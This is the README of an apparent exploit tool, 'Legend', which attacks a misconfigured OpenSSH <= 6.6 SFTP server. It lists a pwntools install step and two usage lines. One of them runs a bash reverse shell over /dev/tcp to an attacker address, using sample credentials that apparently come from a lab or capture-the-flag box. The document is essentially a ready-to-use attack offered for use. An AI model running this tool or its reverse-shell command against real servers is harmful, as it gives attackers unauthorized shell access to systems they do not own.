# Legend
OpenSSH &lt;= 6.6 SFTP (sftp-server) misconfiguration exploit



## Dependencies
pip3 install --upgrade git+https://github.com/arthaud/python3-pwntools.git



## Usage

```sh
./legend.py -r $sftp_ip -p $sftp_port -u $sftp_user -P $sftp_pass -b "$your_ip $your_port"
```

```sh
./legend.py -r 10.10.10.66 -p 2222 -u ftpuser -P "@whereyougo?" -c "/bin/bash -pi >& /dev/tcp/10.10.15.59/443 0>&1"
```
